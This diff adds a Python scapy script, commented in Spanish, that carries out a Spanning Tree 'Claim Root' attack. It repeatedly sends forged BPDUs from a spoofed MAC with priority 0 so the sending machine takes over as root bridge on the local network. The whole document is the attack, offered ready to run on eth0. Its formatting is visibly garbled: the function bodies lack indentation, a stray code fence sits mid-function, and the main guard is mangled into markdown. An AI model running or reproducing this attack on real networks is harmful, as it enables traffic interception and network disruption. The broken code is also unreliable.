@@ -1,0 +1,59 @@
+#!/usr/bin/env python3
+import time
+import sys
+from scapy.all import Ether, STP, LLC, sendp
+
+def stp_claim_root(interfaz):
+print(f"[*] Iniciando ataque STP Claim Root en la interfaz: {interfaz}")
+print("[*] Anunciando nuestra máquina como Root Bridge (Prioridad 0)...")
+print("[*] Presiona Ctrl+C para detener el ataque.\n")
+
+```
+# Dirección MAC multicast oficial para el protocolo STP (IEEE 802.1D)
+mac_stp_multicast = "01:80:c2:00:00:00"
+
+# Forzamos una MAC de origen falsa y muy baja para desempatar la elección
+mac_origen_falsa = "00:00:00:00:00:01"
+
+# 1. Capa de Enlace (Ethernet) hacia la dirección multicast de STP
+capa_ether = Ether(src=mac_origen_falsa, dst=mac_stp_multicast)
+
+# 2. Capa de Control de Enlace Lógico (LLC) requerida por STP
+capa_llc = LLC(dsap=0x42, ssap=0x42, ctrl=3)
+
+# 3. Capa STP optimizada (Sin temporizadores conflictivos)
+# Al poner rootid=0 y bridgeid=0, nos proclamamos el switch con máxima prioridad
+capa_stp = STP(
+    rootid=0,                  # Prioridad 0 para el Root Bridge
+    rootmac=mac_origen_falsa,
+    bridgeid=0,                # Prioridad 0 para nuestro "Switch" ficticio
+    bridgemac=mac_origen_falsa
+)
+
+# Unimos las capas para formar el paquete BPDU definitivo
+paquete_bpdu = capa_ether / capa_llc / capa_stp
+
+contador = 0
+try:
+    while True:
+        # Enviamos el paquete en Capa 2
+        sendp(paquete_bpdu, iface=interfaz, verbose=False)
+        contador += 1
+        print(f"[+] BPDU Root enviado ({contador}) - Diciendo: ¡Yo soy el Root Bridge!")
+
+        # El protocolo exige enviar una BPDU cada 2 segundos
+        time.sleep(2)
+
+except KeyboardInterrupt:
+    print(f"\\n[-] Ataque detenido. Se enviaron {contador} paquetes BPDU.")
+    sys.exit(0)
+
+
+if **name** == "**main**":
+# Asegúrate de que tu interfaz se llama eth0 (o cámbiala a e0 si es necesario)
+interfaz_objetivo = "eth0"
+
+
+stp_claim_root(interfaz_objetivo)
+
+
